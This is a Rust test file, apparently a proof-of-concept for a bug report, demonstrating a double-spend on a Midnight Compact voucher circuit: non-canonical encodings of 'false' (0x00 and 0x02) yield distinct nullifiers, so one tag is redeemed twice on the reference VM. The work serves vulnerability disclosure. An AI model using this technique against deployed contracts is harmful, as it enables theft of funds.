//! The `deserialize<Boolean>` exploit, executed on Midnight's OWN reference VM
//! (`<IrSource as Zkir>::check`, the off-circuit `preprocess`): the SAME voucher
//! `tag` is redeemed twice, once per non-canonical encoding of `false`.
//!
//! `redeem.compact` gates a payout on `if (!deserialize<Boolean,1>(flag))` and
//! commits `persistentHash(flag, tag)` into a `used: Set<Bytes<32>>`, asserting
//! the nullifier is fresh so a `tag` pays out once. But `deserialize` puts no
//! `{0,1}` constraint on `flag`, so `0x00` and `0x02` BOTH decode to `false`
//! and enter the payout branch — and the nullifier hashes the RAW `flag` byte,
//! so the two encodings mint DIFFERENT nullifiers for one `tag`.
//!
//! This test proves that on Compact's compiled circuit:
//!   * `redeem(flag=0x00, tag=T)` is accepted, minting nullifier N0;
//!   * `redeem(flag=0x02, tag=T)` is accepted with the used-set already holding
//!     N0 — accepted because its nullifier N2 != N0, so the freshness read is
//!     honestly `member = false`.
//! Same `tag`, two accepted redemptions. The nullifiers are computed with
//! Midnight's own FAB-repr + SHA-256 (the primitives `preprocess` lowers to);
//! `ir.check` accepting the transcript is what proves those values correct.
//!
//! Run:
//!     cargo test -p minocrab-sim --test redeem_double_spend

use std::borrow::Cow;

use midnight_base_crypto::fab::{Alignment, AlignmentAtom, AlignmentSegment};
use midnight_base_crypto::repr::BinaryHashRepr;
use midnight_transient_crypto::curve::Fr;
use midnight_transient_crypto::fab::{AlignmentExt, ValueReprAlignedValue};
use midnight_transient_crypto::hash::transient_commit;
use midnight_transient_crypto::proofs::{KeyLocation, ProofPreimage, Zkir};
use midnight_zkir_v3::ir::IrSource;
use sha2::{Digest, Sha256};

const ZKIR: &str = include_str!(concat!(
    env!("CARGO_MANIFEST_DIR"),
    "/../../bug-reports/3-boolean-deserialize-non-canonical/redeem.zkir"
));

/// A fixed voucher `tag: Bytes<32>`, fed to the circuit as its two field limbs
/// (`%tag.1` = low byte < 256, `%tag.2` = high 31 bytes < 2^248). Held constant
/// across both redemptions — it is the "same string" being reused.
fn tag() -> (Fr, Fr) {
    (Fr::from(0x53u64), Fr::from(0xDEAD_BEEF_u64))
}

/// The nullifier `persistentHash<[Bytes<1>, Bytes<32>]>([flag, tag])`, computed
/// exactly as `preprocess` does (FAB-repr of the aligned inputs, then SHA-256),
/// returned as the two field limbs `bytes32_into_low_high` produces:
/// `(high = digest[31], low = digest[0..31] little-endian)`.
fn nullifier(flag: u8, tag: (Fr, Fr)) -> (Fr, Fr) {
    let align = Alignment(vec![
        AlignmentSegment::Atom(AlignmentAtom::Bytes { length: 1 }),
        AlignmentSegment::Atom(AlignmentAtom::Bytes { length: 32 }),
    ]);
    let value = align
        .parse_field_repr(&[Fr::from(flag as u64), tag.0, tag.1])
        .expect("inputs match [Bytes<1>, Bytes<32>] alignment");
    let mut repr = Vec::new();
    ValueReprAlignedValue(value).binary_repr(&mut repr);
    let digest: [u8; 32] = Sha256::digest(&repr).into();
    let high = Fr::from(digest[31] as u64);
    let low = Fr::from_le_bytes(&digest[0..31]).expect("31 bytes < field modulus");
    (low, high)
}

/// A preimage for `redeem(flag, tag)` taking the payout (`else`) branch — i.e.
/// `flag != 0x01`. `member_bit` is the ledger's freshness answer supplied for
/// this nullifier (`0` = fresh, `1` = already in `used`); `corrupt_nul` perturbs
/// the committed nullifier so the negative controls can show it is really
/// checked.
fn redeem_taking_payout(flag: u8, tag: (Fr, Fr), member_bit: u64, corrupt_nul: bool) -> ProofPreimage {
    assert_ne!(flag, 0x01, "this preimage models the else/payout branch");
    let (mut low, high) = nullifier(flag, tag);
    if corrupt_nul {
        low = Fr::from(0x1234_5678u64); // a value that is not the real limb
    }
    let fr = |b: u64| Fr::from(b);

    // The else-branch public transcript, impact-by-impact, straight off
    // `redeem.zkir`. The two Set operations (member-read and insert) carry the
    // nullifier limbs in `[high, low]` order (`%nul.11`, `%nul.10`); the
    // freshness read `%t.12` is `member`.
    let member = fr(member_bit);
    let mut t: Vec<Fr> = Vec::new();
    t.extend([fr(0x30)]);
    t.extend([fr(0x50), fr(0x01), fr(0x01), fr(0x00)]);
    t.extend([fr(0x10), fr(0x01), fr(0x01), fr(0x20), high, low]);
    t.extend([fr(0x18)]);
    t.extend([fr(0x0d), fr(0x01), fr(0x01), member]);
    t.extend([fr(0x70), fr(0x01), fr(0x01), fr(0x00)]);
    t.extend([fr(0x10), fr(0x01), fr(0x01), fr(0x20), high, low]);
    t.extend([fr(0x11), fr(0x00)]);
    t.extend([fr(0x91)]);
    t.extend([fr(0xa1)]);

    let inputs = vec![Fr::from(flag as u64), tag.0, tag.1];
    let randomness = Fr::from(0u64);
    let commitment = transient_commit(&inputs[..], randomness);
    ProofPreimage {
        inputs,
        private_transcript: vec![],
        public_transcript_inputs: t,
        public_transcript_outputs: vec![member], // the one `member` read
        binding_input: 0.into(),
        communications_commitment: Some((commitment, randomness)),
        key_location: KeyLocation(Cow::Borrowed("redeem")),
    }
}

#[test]
fn one_voucher_redeemed_twice_via_non_canonical_false() {
    let ir = IrSource::load(ZKIR.as_bytes()).expect("parse redeem.zkir");
    let tag = tag();

    // Redemption 1: canonical false byte. used = {} -> member(N0) = false.
    let n0 = nullifier(0x00, tag);
    assert!(
        ir.check(&redeem_taking_payout(0x00, tag, 0, false)).is_ok(),
        "redeem(flag=0x00, tag) must be accepted (first redemption)",
    );

    // Redemption 2: NON-canonical false byte, SAME tag. The ledger now holds
    // N0, but the freshness read is honestly false because N2 != N0.
    let n2 = nullifier(0x02, tag);
    assert_ne!(
        n0, n2,
        "the two encodings of `false` mint DIFFERENT nullifiers for one tag \
         — this is why the used-set does not block the second redemption",
    );
    assert!(
        ir.check(&redeem_taking_payout(0x02, tag, 0, false)).is_ok(),
        "redeem(flag=0x02, tag) must be accepted (second redemption of the SAME voucher)",
    );

    // Cross-check acceptance against the minocrab simulator too, so the
    // double-spend does not rest on one interpreter.
    for flag in [0x00u8, 0x02] {
        let pre = redeem_taking_payout(flag, tag, 0, false);
        assert!(
            minocrab_sim::v3::simulate(&ir, &pre).is_ok(),
            "simulator must also accept redeem(flag={flag:#04x})",
        );
    }
}

/// Negative controls — prove the acceptances above are NOT vacuous.
#[test]
fn transcript_is_actually_enforced() {
    let ir = IrSource::load(ZKIR.as_bytes()).expect("parse redeem.zkir");
    let tag = tag();

    // A corrupted nullifier is rejected: `preprocess` recomputes the hash and
    // bails on the transcript mismatch. So the acceptances above genuinely
    // pinned the real `persistentHash(flag, tag)`.
    assert!(
        ir.check(&redeem_taking_payout(0x02, tag, 0, true)).is_err(),
        "a wrong nullifier must be rejected (else the acceptance proves nothing)",
    );

    // Claiming the nullifier is already used (member = 1) fails the freshness
    // assert — so `member = 0` in the redemptions above is doing real work, and
    // the guard genuinely blocks a repeat of the SAME nullifier.
    assert!(
        ir.check(&redeem_taking_payout(0x02, tag, 1, false)).is_err(),
        "member=1 must fail assert(!used.member(nul))",
    );
}
